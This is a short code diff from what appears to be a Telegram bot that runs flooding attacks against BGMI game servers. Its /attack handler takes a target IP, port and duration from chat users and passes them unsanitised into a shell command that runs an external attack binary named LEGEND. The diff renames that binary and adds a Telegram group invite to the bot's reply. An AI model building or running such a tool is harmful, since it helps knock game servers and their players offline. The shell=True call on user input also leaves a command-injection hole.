@@ -236,9 +236,9 @@ def handle_attack(message):
                 record_command_logs(user_id, '/attack', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./LEGEND3 {target} {port} {time}"
+                full_command = f"./LEGEND {target} {port} {time}"
                 subprocess.run(full_command, shell=True)
-                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time} JOIN:-https://t.me/+m7BuMxZX815hYzdl"
         else:
             response = "✅ Usage :- /attack <target> <port> <time>"  # Updated command syntax
     else:
